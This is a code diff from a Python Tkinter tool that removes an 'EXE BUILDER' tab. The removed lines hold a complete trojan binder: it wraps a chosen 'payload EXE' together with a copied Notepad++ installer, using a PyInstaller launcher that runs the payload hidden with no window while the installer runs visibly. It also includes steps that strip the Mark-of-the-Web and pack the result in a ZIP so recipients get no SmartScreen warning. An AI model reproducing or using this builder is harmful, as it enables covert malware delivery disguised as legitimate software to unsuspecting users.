@@ -98,17 +98,9 @@ class K4LIApp:
         self.xlsx_out_var  = tk.StringVar(value="")
         self.xlsx_running  = False
 
-        # EXE BUILDER tab state
-        self.builder_icon_path    = tk.StringVar(value="")
-        self.builder_app_name     = tk.StringVar(value="MyApp")
-        self.builder_out_dir      = tk.StringVar(value="")
-        self.builder_payload_path  = tk.StringVar(value="")
-        self.builder_running       = False
-
         self._prot_canvas    = None
         self._conv_canvas    = None
         self._xlsx_canvas    = None
-        self._builder_canvas = None
         self._active_scroll_canvas = None
 
         self._build()
@@ -189,25 +181,18 @@ class K4LIApp:
                                    fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
                                    padx=22, pady=5, cursor="hand2",
                                    command=lambda: self._sw("xlsx"))
-        self.btn_builder = tk.Button(bar, text="EXE BUILDER", font=F_TAB,
-                                      fg=C_G3, bg=BG_ROOT, relief="flat", bd=0,
-                                      padx=22, pady=5, cursor="hand2",
-                                      command=lambda: self._sw("builder"))
         self.btn_prot.pack(side="left", padx=(18, 4), pady=4)
         self.btn_conv.pack(side="left", padx=(0, 4), pady=4)
         self.btn_xlsx.pack(side="left", padx=(0, 4), pady=4)
-        self.btn_builder.pack(side="left", padx=(0, 4), pady=4)
 
     def _sw(self, tab: str):
         self.active_tab = tab
         self.frm_prot.pack_forget()
         self.frm_conv.pack_forget()
         self.frm_xlsx.pack_forget()
-        self.frm_builder.pack_forget()
         self.btn_prot.configure(fg=C_G3, bg=BG_ROOT)
         self.btn_conv.configure(fg=C_G3, bg=BG_ROOT)
         self.btn_xlsx.configure(fg=C_G3, bg=BG_ROOT)
-        self.btn_builder.configure(fg=C_G3, bg=BG_ROOT)
         if tab == "protect":
             self.btn_prot.configure(fg=C_WH, bg=BG_CARD)
             self.frm_prot.pack(fill="both", expand=True)
@@ -216,26 +201,20 @@ class K4LIApp:
             self.btn_conv.configure(fg=C_WH, bg=BG_CARD)
             self.frm_conv.pack(fill="both", expand=True)
             self._active_scroll_canvas = self._conv_canvas
-        elif tab == "xlsx":
+        else:
             self.btn_xlsx.configure(fg=C_WH, bg=BG_CARD)
             self.frm_xlsx.pack(fill="both", expand=True)
             self._active_scroll_canvas = self._xlsx_canvas
-        else:
-            self.btn_builder.configure(fg=C_WH, bg=BG_CARD)
-            self.frm_builder.pack(fill="both", expand=True)
-            self._active_scroll_canvas = self._builder_canvas
 
     def _mk_content(self):
         c = tk.Frame(self.root, bg=BG_ROOT)
         c.pack(fill="both", expand=True)
-        self.frm_prot    = tk.Frame(c, bg=BG_ROOT)
-        self.frm_conv    = tk.Frame(c, bg=BG_ROOT)
-        self.frm_xlsx    = tk.Frame(c, bg=BG_ROOT)
-        self.frm_builder = tk.Frame(c, bg=BG_ROOT)
+        self.frm_prot = tk.Frame(c, bg=BG_ROOT)
+        self.frm_conv = tk.Frame(c, bg=BG_ROOT)
+        self.frm_xlsx = tk.Frame(c, bg=BG_ROOT)
         self._build_protect_tab()
         self._build_convert_tab()
         self._build_xlsx_tab()
-        self._build_builder_tab()
         self._sw("protect")
 
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -3402,431 +3381,6 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                 fg=C_GRN if pct == 100 else C_WH
             )
         self.root.after(0, _do)
-
-
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    #  EXE BUILDER TAB
-    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-    def _build_builder_tab(self):
-        p = self.frm_builder
-        _scroll_inner, self._builder_canvas = self._scrollable_frame(p)
-        wrap = tk.Frame(_scroll_inner, bg=BG_ROOT, padx=22, pady=16)
-        wrap.pack(fill="both", expand=True)
-
-        # ── Info banner ────────────────────────────────────────────────────
-        info = tk.Frame(wrap, bg="#1e293b", padx=14, pady=10)
-        info.pack(fill="x", pady=(0, 18))
-        tk.Label(info, text="SOURCE EXE", font=("Segoe UI", 8, "bold"),
-                 fg=C_G3, bg="#1e293b").pack(anchor="w")
-        src_path = str(Path(__file__).parent / "myoldapp_extracted" / "notepadplusplus.exe")
-        tk.Label(info, text=src_path, font=("Consolas", 9),
-                 fg=C_CYN, bg="#1e293b", wraplength=620, justify="left").pack(anchor="w", pady=(2, 0))
-
-        # ── App Name ───────────────────────────────────────────────────────
-        self._lbl(wrap, "APP NAME").pack(fill="x", pady=(0, 5))
-        row_name = tk.Frame(wrap, bg=BG_ROOT)
-        row_name.pack(fill="x", pady=(0, 14))
-        ent_name = tk.Entry(row_name, textvariable=self.builder_app_name,
-                            font=("Consolas", 10), bg=BG_CARD, fg=C_WH,
-                            insertbackground=C_WH, relief="flat", bd=0,
-                            highlightthickness=1, highlightbackground=BD_DIM,
-                            highlightcolor=C_CYN)
-        ent_name.pack(fill="x", ipady=7, padx=(0, 0))
-
-        # ── Info note about signature ──────────────────────────────────────
-        note = tk.Frame(wrap, bg="#1a2e1a", padx=12, pady=8)
-        note.pack(fill="x", pady=(0, 14))
-        tk.Label(note,
-                 text="✔  Signature safe mode: EXE binary is NOT modified.\n"
-                      "    Only the filename changes. A .lnk shortcut carries the custom icon.",
-                 font=("Segoe UI", 8), fg=C_GRN, bg="#1a2e1a",
-                 justify="left").pack(anchor="w")
-
-        # ── App Icon ───────────────────────────────────────────────────────
-        self._lbl(wrap, "APP ICON  (.ico)  — used for shortcut").pack(fill="x", pady=(0, 5))
-        row_ico = tk.Frame(wrap, bg=BG_ROOT)
-        row_ico.pack(fill="x", pady=(0, 14))
-        ent_ico = tk.Entry(row_ico, textvariable=self.builder_icon_path,
-                           font=("Consolas", 9), bg=BG_CARD, fg=C_G3,
-                           insertbackground=C_WH, relief="flat", bd=0,
-                           highlightthickness=1, highlightbackground=BD_DIM,
-                           highlightcolor=C_CYN, state="readonly")
-        ent_ico.pack(side="left", fill="x", expand=True, ipady=6)
-        tk.Frame(row_ico, bg=BG_ROOT, width=6).pack(side="left")
-        self._sq_btn(row_ico, "BROWSE", lambda: self._pick_builder_icon(),
-                     bg=BG_CARD).pack(side="left")
-
-        # ── Payload EXE ────────────────────────────────────────────────────
-        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(4, 14))
-        payload_hdr = tk.Frame(wrap, bg=BG_ROOT)
-        payload_hdr.pack(fill="x", pady=(0, 4))
-        self._lbl(payload_hdr, "PAYLOAD EXE  (runs silently in background)").pack(side="left")
-        tk.Label(payload_hdr, text="optional", font=("Segoe UI", 8),
-                 fg=C_AMB, bg=BG_ROOT).pack(side="left", padx=(8, 0))
-
-        payload_info = tk.Frame(wrap, bg="#1e1a10", padx=12, pady=7)
-        payload_info.pack(fill="x", pady=(0, 8))
-        tk.Label(payload_info,
-                 text="When the output EXE is double-clicked the installer runs normally\n"
-                      "and the payload EXE launches silently in the background at the same time.\n"
-                      "Requires PyInstaller  (pip install pyinstaller).",
-                 font=("Segoe UI", 8), fg=C_AMB, bg="#1e1a10",
-                 justify="left").pack(anchor="w")
-
-        row_pay = tk.Frame(wrap, bg=BG_ROOT)
-        row_pay.pack(fill="x", pady=(0, 14))
-        ent_pay = tk.Entry(row_pay, textvariable=self.builder_payload_path,
-                           font=("Consolas", 9), bg=BG_CARD, fg=C_G3,
-                           insertbackground=C_WH, relief="flat", bd=0,
-                           highlightthickness=1, highlightbackground=BD_DIM,
-                           highlightcolor=C_AMB, state="readonly")
-        ent_pay.pack(side="left", fill="x", expand=True, ipady=6)
-        tk.Frame(row_pay, bg=BG_ROOT, width=6).pack(side="left")
-        self._sq_btn(row_pay, "BROWSE", lambda: self._pick_builder_payload(),
-                     bg=BG_CARD).pack(side="left")
-        tk.Frame(row_pay, bg=BG_ROOT, width=6).pack(side="left")
-        self._sq_btn(row_pay, "CLEAR",
-                     lambda: self.builder_payload_path.set(""),
-                     bg=BG_CARD).pack(side="left")
-
-        # ── Output folder ──────────────────────────────────────────────────
-        self._lbl(wrap, "OUTPUT FOLDER").pack(fill="x", pady=(0, 5))
-        row_out = tk.Frame(wrap, bg=BG_ROOT)
-        row_out.pack(fill="x", pady=(0, 18))
-        ent_out = tk.Entry(row_out, textvariable=self.builder_out_dir,
-                           font=("Consolas", 9), bg=BG_CARD, fg=C_G3,
-                           insertbackground=C_WH, relief="flat", bd=0,
-                           highlightthickness=1, highlightbackground=BD_DIM,
-                           highlightcolor=C_CYN, state="readonly")
-        ent_out.pack(side="left", fill="x", expand=True, ipady=6)
-        tk.Frame(row_out, bg=BG_ROOT, width=6).pack(side="left")
-        self._sq_btn(row_out, "BROWSE", lambda: self._pick_builder_out(),
-                     bg=BG_CARD).pack(side="left")
-
-        # ── SmartScreen bypass options ─────────────────────────────────────
-        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(4, 12))
-        self._lbl(wrap, "SMARTSCREEN BYPASS  (no cert needed)").pack(fill="x", pady=(0, 6))
-
-        bypass_info = tk.Frame(wrap, bg="#0f172a", padx=12, pady=8)
-        bypass_info.pack(fill="x", pady=(0, 10))
-        tk.Label(bypass_info,
-                 text="SmartScreen sirf MOTW (Zone.Identifier) wali files check karti hai.\n"
-                      "Neeche ke options MOTW hata dete hain → SmartScreen trigger nahi hoti.",
-                 font=("Segoe UI", 8), fg=C_G3, bg="#0f172a",
-                 justify="left").pack(anchor="w")
-
-        row_bypass = tk.Frame(wrap, bg=BG_ROOT)
-        row_bypass.pack(fill="x", pady=(0, 6))
-
-        self.bypass_unblock_var = tk.BooleanVar(value=True)
-        self.bypass_zip_var     = tk.BooleanVar(value=False)
-
-        tk.Checkbutton(row_bypass, text="Auto Unblock EXE after build  (strips Zone.Identifier — no SmartScreen on this PC)",
-                       variable=self.bypass_unblock_var,
-                       font=("Segoe UI", 8), fg=C_WH, bg=BG_ROOT,
-                       activebackground=BG_ROOT, activeforeground=C_WH,
-                       selectcolor=BG_CARD, relief="flat", bd=0,
-                       cursor="hand2").pack(anchor="w")
-
-        tk.Checkbutton(row_bypass, text="Pack into ZIP after build  (distribute ZIP → no MOTW on recipient PC when extracted with 7-Zip)",
-                       variable=self.bypass_zip_var,
-                       font=("Segoe UI", 8), fg=C_WH, bg=BG_ROOT,
-                       activebackground=BG_ROOT, activeforeground=C_WH,
-                       selectcolor=BG_CARD, relief="flat", bd=0,
-                       cursor="hand2").pack(anchor="w", pady=(4, 0))
-
-        # ── Build button ───────────────────────────────────────────────────
-        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(10, 14))
-        btn_build = tk.Button(wrap, text="▶  BUILD EXE",
-                              font=("Segoe UI", 11, "bold"),
-                              fg=BG_ROOT, bg=C_GRN, relief="flat", bd=0,
-                              padx=30, pady=10, cursor="hand2",
-                              activebackground=C_GRN, activeforeground=BG_ROOT,
-                              command=self._start_builder)
-        btn_build.pack(fill="x", pady=(0, 18))
-
-        # ── Log area ───────────────────────────────────────────────────────
-        self._lbl(wrap, "BUILD LOG").pack(fill="x", pady=(0, 5))
-        log_frame = tk.Frame(wrap, bg=BG_CARD, padx=1, pady=1)
-        log_frame.pack(fill="both", expand=True)
-        self.builder_log = tk.Text(log_frame, bg=BG_CARD, fg=C_G3,
-                                   font=("Consolas", 9), relief="flat",
-                                   state="disabled", wrap="word",
-                                   height=14, bd=0,
-                                   highlightthickness=0)
-        self.builder_log.pack(fill="both", expand=True, padx=10, pady=8)
-        self.builder_log.tag_configure("ok",  foreground=C_GRN)
-        self.builder_log.tag_configure("err", foreground=C_RED)
-        self.builder_log.tag_configure("hd",  foreground=C_CYN)
-
-        # ── Bottom actions ─────────────────────────────────────────────────
-        row_bot = tk.Frame(wrap, bg=BG_ROOT)
-        row_bot.pack(fill="x", pady=(10, 4))
-        self._sq_btn(row_bot, "OPEN OUTPUT FOLDER",
-                     self._builder_open_folder, bg=BG_CARD).pack(side="left")
-        self._sq_btn(row_bot, "CLEAR LOG",
-                     self._clear_builder_log, bg=BG_CARD).pack(side="left", padx=(8, 0))
-
-    def _pick_builder_payload(self):
-        from tkinter import filedialog
-        p = filedialog.askopenfilename(
-            title="Select payload EXE (runs in background)",
-            filetypes=[("EXE files", "*.exe"), ("All files", "*.*")])
-        if p:
-            self.builder_payload_path.set(p)
-
-    def _pick_builder_icon(self):
-        from tkinter import filedialog
-        p = filedialog.askopenfilename(
-            title="Select icon (.ico)",
-            filetypes=[("ICO files", "*.ico"), ("All files", "*.*")])
-        if p:
-            self.builder_icon_path.set(p)
-
-    def _pick_builder_out(self):
-        from tkinter import filedialog
-        p = filedialog.askdirectory(title="Select output folder")
-        if p:
-            self.builder_out_dir.set(p)
-
-    def _builder_open_folder(self):
-        import subprocess, platform
-        d = self.builder_out_dir.get().strip()
-        if not d:
-            src = Path(__file__).parent / "myoldapp_extracted"
-            d = str(src)
-        if platform.system() == "Windows":
-            subprocess.Popen(["explorer", d])
-        elif platform.system() == "Darwin":
-            subprocess.Popen(["open", d])
-        else:
-            subprocess.Popen(["xdg-open", d])
-
-    def _bldr_ln(self, text: str, tag: str = ""):
-        def _do():
-            self.builder_log.configure(state="normal")
-            self.builder_log.insert("end", text + "\n", tag if tag else ())
-            self.builder_log.see("end")
-            self.builder_log.configure(state="disabled")
-        self.root.after(0, _do)
-
-    def _clear_builder_log(self):
-        self.builder_log.configure(state="normal")
-        self.builder_log.delete("1.0", "end")
-        self.builder_log.configure(state="disabled")
-
-    def _start_builder(self):
-        if self.builder_running:
-            return
-        import threading
-        self._clear_builder_log()
-        self.builder_running = True
-        threading.Thread(target=self._run_builder, daemon=True).start()
-
-    def _run_builder(self):
-        import shutil, subprocess, platform, os, tempfile
-
-        app_name     = self.builder_app_name.get().strip() or "MyApp"
-        ico_path     = self.builder_icon_path.get().strip()
-        out_dir      = self.builder_out_dir.get().strip()
-        payload_path = self.builder_payload_path.get().strip()
-
-        src = Path(__file__).parent / "myoldapp_extracted" / "notepadplusplus.exe"
-
-        self._bldr_ln(f"Source  : {src}", "hd")
-        self._bldr_ln(f"Name    : {app_name}", "hd")
-        if ico_path:
-            self._bldr_ln(f"Icon    : {ico_path}", "hd")
-        if payload_path:
-            self._bldr_ln(f"Payload : {payload_path}", "hd")
-        self._bldr_ln("")
-
-        if not src.exists():
-            self._bldr_ln(f"ERROR: source not found: {src}", "err")
-            self.builder_running = False
-            return
-
-        if not out_dir:
-            out_dir = str(src.parent)
-            self._bldr_ln(f"Output folder not set — using {out_dir}", "")
-
-        safe_name = "".join(c for c in app_name if c.isalnum() or c in " _-").strip() or "MyApp"
-        out_path = Path(out_dir) / f"{safe_name}.exe"
-        out_path.parent.mkdir(parents=True, exist_ok=True)
-
-        do_unblock = self.bypass_unblock_var.get()
-        do_zip     = self.bypass_zip_var.get()
-
-        if payload_path:
-            # ── BUNDLED MODE: PyInstaller launcher that runs both EXEs ──────
-            self._bldr_ln("Payload mode: building bundled launcher …")
-            self._run_builder_bundled(src, payload_path, ico_path,
-                                      out_path, safe_name)
-        else:
-            # ── SIMPLE MODE: copy only, keep Authenticode signature intact ──
-            self._run_builder_simple(src, ico_path, out_path, safe_name, out_dir)
-
-        # ── SmartScreen bypass steps ────────────────────────────────────────
-        if out_path.exists():
-            if do_unblock:
-                self._bldr_bypass_unblock(out_path)
-            if do_zip:
-                self._bldr_bypass_zip(out_path)
-
-        self.builder_running = False
-
-    def _run_builder_simple(self, src, ico_path, out_path, safe_name, out_dir):
-        import shutil, subprocess, platform
-        self._bldr_ln("Copying EXE (signature preserved) …")
-        try:
-            shutil.copy2(str(src), str(out_path))
-        except Exception as e:
-            self._bldr_ln(f"ERROR: copy failed — {e}", "err")
-            return
-        self._bldr_ln(f"Copied  → {out_path}", "ok")
-
-        lnk_path = Path(out_dir) / f"{safe_name}.lnk"
-        if ico_path and platform.system() == "Windows":
-            self._bldr_ln("Creating shortcut with custom icon …")
-            try:
-                ps = (
-                    f'$ws = New-Object -ComObject WScript.Shell; '
-                    f'$sc = $ws.CreateShortcut("{lnk_path}"); '
-                    f'$sc.TargetPath = "{out_path}"; '
-                    f'$sc.IconLocation = "{ico_path}"; '
-                    f'$sc.Save()'
-                )
-                r = subprocess.run(
-                    ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
-                    capture_output=True, text=True, timeout=15)
-                if r.returncode == 0:
-                    self._bldr_ln(f"Shortcut → {lnk_path}", "ok")
-                else:
-                    self._bldr_ln(f"WARNING: shortcut — {r.stderr.strip()}", "")
-            except Exception as e:
-                self._bldr_ln(f"WARNING: shortcut skipped — {e}", "")
-
-        self._bldr_ln("")
-        self._bldr_ln(f"Done!  →  {out_path}", "ok")
-        self._bldr_ln("Authenticode signature intact.", "ok")
-
-    def _bldr_bypass_unblock(self, out_path: Path):
-        """Strip Zone.Identifier (MOTW) from output EXE via PowerShell Unblock-File."""
-        import subprocess, platform
-        if platform.system() != "Windows":
-            self._bldr_ln("Unblock: Windows only — skipped", "")
-            return
-        self._bldr_ln("Removing MOTW (Zone.Identifier) …")
-        try:
-            ps = f'Unblock-File -LiteralPath "{out_path}"'
-            r = subprocess.run(
-                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
-                capture_output=True, text=True, timeout=10)
-            if r.returncode == 0:
-                self._bldr_ln("MOTW removed — SmartScreen will NOT trigger on this PC", "ok")
-            else:
-                # fallback: delete ADS directly
-                ads = str(out_path) + ":Zone.Identifier"
-                try:
-                    import os
-                    os.remove(ads)
-                    self._bldr_ln("MOTW removed (ADS delete)", "ok")
-                except Exception:
-                    self._bldr_ln(f"WARNING: MOTW remove — {r.stderr.strip()}", "")
-        except Exception as e:
-            self._bldr_ln(f"WARNING: unblock skipped — {e}", "")
-
-    def _bldr_bypass_zip(self, out_path: Path):
-        """Pack EXE into a ZIP. Files extracted from ZIP with 7-Zip have no MOTW."""
-        import zipfile
-        zip_path = out_path.with_suffix(".zip")
-        self._bldr_ln("Packing into ZIP …")
-        try:
-            with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
-                zf.write(str(out_path), out_path.name)
-            self._bldr_ln(f"ZIP created → {zip_path}", "ok")
-            self._bldr_ln("Share this ZIP — recipient extracts with 7-Zip → no MOTW → no SmartScreen", "ok")
-        except Exception as e:
-            self._bldr_ln(f"WARNING: ZIP failed — {e}", "")
-
-    def _run_builder_bundled(self, src, payload_path, ico_path, out_path, safe_name):
-        import shutil, subprocess, tempfile, os
-
-        # check pyinstaller
-        try:
-            r = subprocess.run(["pyinstaller", "--version"],
-                               capture_output=True, text=True, timeout=10)
-            if r.returncode != 0:
-                raise RuntimeError("not found")
-            self._bldr_ln(f"PyInstaller {r.stdout.strip()} found", "ok")
-        except Exception:
-            self._bldr_ln("ERROR: PyInstaller not found.", "err")
-            self._bldr_ln("Install it:  pip install pyinstaller", "err")
-            return
-
-        tmpdir = tempfile.mkdtemp(prefix="k4li_builder_")
-        try:
-            self._bldr_ln(f"Work dir: {tmpdir}")
-
-            inst_copy = os.path.join(tmpdir, "installer.exe")
-            pay_copy  = os.path.join(tmpdir, "payload.exe")
-            shutil.copy2(str(src), inst_copy)
-            shutil.copy2(payload_path, pay_copy)
-            self._bldr_ln("Copied installer + payload into work dir", "ok")
-
-            # launcher script — runs payload silently then installer visibly
-            launcher_code = (
-                "import subprocess, sys, os\n"
-                "def _r(n):\n"
-                "    base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n"
-                "    return os.path.join(base, n)\n"
-                "subprocess.Popen([_r('payload.exe')],\n"
-                "    creationflags=0x08000000)  # CREATE_NO_WINDOW\n"
-                "subprocess.Popen([_r('installer.exe')])\n"
-            )
-            launcher_py = os.path.join(tmpdir, "launcher.py")
-            with open(launcher_py, "w") as f:
-                f.write(launcher_code)
-            self._bldr_ln("Launcher script written", "ok")
-
-            dist_dir  = str(out_path.parent)
-            work_dir  = os.path.join(tmpdir, "build")
-            spec_dir  = tmpdir
-
-            cmd = [
-                "pyinstaller",
-                "--onefile",
-                "--noconsole",
-                f"--add-data={inst_copy}{os.pathsep}.",
-                f"--add-data={pay_copy}{os.pathsep}.",
-                f"--distpath={dist_dir}",
-                f"--workpath={work_dir}",
-                f"--specpath={spec_dir}",
-                f"--name={safe_name}",
-            ]
-            if ico_path:
-                cmd.append(f"--icon={ico_path}")
-            cmd.append(launcher_py)
-
-            self._bldr_ln("Running PyInstaller …")
-            proc = subprocess.Popen(
-                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                text=True, cwd=tmpdir)
-            for line in proc.stdout:
-                line = line.rstrip()
-                if line:
-                    tag = "err" if "ERROR" in line else ("ok" if "completed" in line.lower() else "")
-                    self._bldr_ln(f"  {line}", tag)
-            proc.wait()
-
-            if proc.returncode == 0 and out_path.exists():
-                self._bldr_ln("")
-                self._bldr_ln(f"Done!  →  {out_path}", "ok")
-                self._bldr_ln("Double-click the EXE → installer runs + payload in background.", "ok")
-            else:
-                self._bldr_ln(f"ERROR: PyInstaller exited {proc.returncode}", "err")
-        finally:
-            shutil.rmtree(tmpdir, ignore_errors=True)
 
 
 # ─── Entry Point ───────────────────────────────────────────────────────────────
